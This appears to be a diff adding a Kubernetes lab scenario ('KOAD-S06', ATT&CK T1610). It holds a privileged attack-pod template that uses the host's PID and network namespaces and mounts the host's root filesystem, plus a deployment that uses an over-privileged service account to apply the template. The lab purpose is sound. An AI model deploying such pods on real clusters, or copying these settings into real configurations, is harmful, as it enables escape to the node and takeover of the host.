@@ -1,0 +1,74 @@
+# KOAD-S06: Deploy Privileged Attack Pod
+# ATT&CK: T1610 — Deploy Container
+# Attack: Use SA permissions to deploy a privileged Pod
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: attack-pod-template
+  namespace: koad
+  labels:
+    koad-scenario: S06
+    mitre-attck: T1610
+data:
+  privileged-pod.yaml: |
+    apiVersion: v1
+    kind: Pod
+    metadata:
+      name: attack-pod
+      namespace: koad
+    spec:
+      hostPID: true
+      hostNetwork: true
+      containers:
+        - name: attack
+          image: ubuntu:22.04
+          command: ["sh", "-c", "sleep infinity"]
+          securityContext:
+            privileged: true
+          volumeMounts:
+            - name: host-root
+              mountPath: /host
+      volumes:
+        - name: host-root
+          hostPath:
+            path: /
+            type: Directory
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: deploy-attacker
+  namespace: koad
+  labels:
+    app: deploy-attacker
+    koad-scenario: S06
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: deploy-attacker
+  template:
+    metadata:
+      labels:
+        app: deploy-attacker
+        koad-scenario: S06
+    spec:
+      serviceAccountName: overprivileged-sa
+      containers:
+        - name: deployer
+          image: bitnami/kubectl:latest
+          command: ["sh", "-c"]
+          args:
+            - |
+              echo "=== KOAD-S06: Deploy Privileged Pod ==="
+              echo "Use the template to deploy an attack pod:"
+              echo "  kubectl apply -f /templates/privileged-pod.yaml"
+              sleep infinity
+          volumeMounts:
+            - name: templates
+              mountPath: /templates
+      volumes:
+        - name: templates
+          configMap:
+            name: attack-pod-template
